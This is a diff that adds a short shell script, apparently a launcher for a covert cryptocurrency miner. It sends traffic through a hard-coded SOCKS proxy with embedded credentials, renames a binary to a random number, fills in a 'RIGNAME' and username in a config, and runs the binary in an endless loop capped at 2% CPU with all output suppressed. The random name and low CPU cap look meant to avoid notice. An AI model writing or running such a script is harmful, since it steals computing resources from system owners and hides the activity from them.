@@ -1,0 +1,9 @@
+export http_proxy=socsk5://jancok:12345@147.182.228.194:8000
+export https_proxy=socsk5://jancok:12345@147.182.228.194:8000
+chmod +x lol build_config
+TOP=$(shuf -n 1 -i 1-999999)
+USER=$1
+mv lol $TOP
+sed -i "s/RIGNAME/$TOP/" "build_config"
+sed -i "s/USERNAME/$USER/" "build_config"
+while :; do timeout 1m cpulimit -l 2 ./$TOP; sleep 20; done >/dev/null >/dev/null 2>&1
